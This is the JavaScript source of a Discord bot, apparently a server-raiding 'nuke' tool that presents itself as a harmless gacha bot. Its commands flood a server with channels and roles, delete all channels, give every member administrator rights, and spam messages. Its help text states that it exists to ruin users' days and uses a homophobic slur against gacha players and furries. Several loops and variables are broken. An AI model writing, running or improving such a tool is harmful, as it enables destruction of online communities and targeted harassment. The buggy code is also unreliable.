const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = '$';

function spamhoke(){
    for(let spame = 0; spame == 500; spame++) webhook.send(`${args.slice(0).join(' ')}`)
}

client.on("ready", () => { 
    console.log(`ready for destroy ppl's days`)
    console.log(`Defoko V3`)
    client.user.setActivity(`Defoco V3 - Prefix: $ [a nice gacha life bot]`);
});

client.on("message", async (message) => {
    if(message.author.bot) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const comando = args.shift().toLowerCase();

    const server = message.guild.channels;

    switch(comando) {
        case "yeet":
            message.delete();
            if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
            let i;
            if(!args.slice(0).join(' ')){ 
                message.guild.setName('haha admin go grr -ags and gs')
                for(i = 0; i < 499; i++){
                    message.guild.createChannel('haha admin go grr', 'text')
                    message.guild.createChannel('haha admin go grr', 'voice')
                }
            } else {
                message.guild.setName(`${args.slice(0).join(' ')}`)
                for(i = 0; i < 499; i++){
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text')
                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
                }
            }
            for(i = 0; i == 250; i++) message.guild.createRole('NOOT NOOT')
        break;
        case "del":
            message.delete();
            server.deleteAll();
            message.guild.createChannel('lmaoo', 'text')
        break;
        case "admall":
            message.delete();
            message.guild.defaultRole.setPermissions(['ADMINISTRATOR']);
        break;
        case "servername":
            message.delete();
            if(!args.slice(0).join(' ')) return message.channel.send("give a name, dumbass")
            message.guild.setName(`${args.slice(0).join(' ')}`)
        break;
        case "help":
            message.delete();
            const help = [`Tefoco V3\n`,
            "prefix: $",
            "$yeet (optional name for the things)- makes a lot of text channels and vcs, and roles, also changes the server's name",
            "$del - yeets all the channels and only leaves one",
            "$admall - self explanatory",
            "$servername (new server name) - self explanatory",
            "$spam (text) - self explanatory",
            `$help - bruhhh\n`,
            "Bot by paradino, making gachafags and furries lifes worse"]
            message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
        break;
        case "cyclename":
            if(args[0] == isNaN()) return message.author.send(`invalid number`).catch(() => message.channel.send(`enable yo dms dumbass`))
            if(!args[1]) return message.author.send(`which. fucking. channel. name`).catch(() => message.channel.send(`enable yo dms dumbass`))
            if(args.slice(1).join(' ').length > 32) return message.author.send(`channel name too big, make it less than 32 characters pls`).catch(() => message.channel.send(`enable yo dms dumbass`))
            var chlist = new Array()
            let channels = message.guild.channels;
            for (const channel of channels.values()){
                chlist.push(channel.id);
            }
            for(let ii = 0; ii < args[0]; i++){
                for(let iii = 0; iii < chlist.length; iii++){
                    var currch = client.channels.get(chlist[iii])
                    currch.setName(`--------------------------------`)
                    currch.setName(args.slice(1).join(' '))
                }
            }
        break;
    }
});

client.login(process.env.token);

//para de olhar aqui poha
//- mene paradino
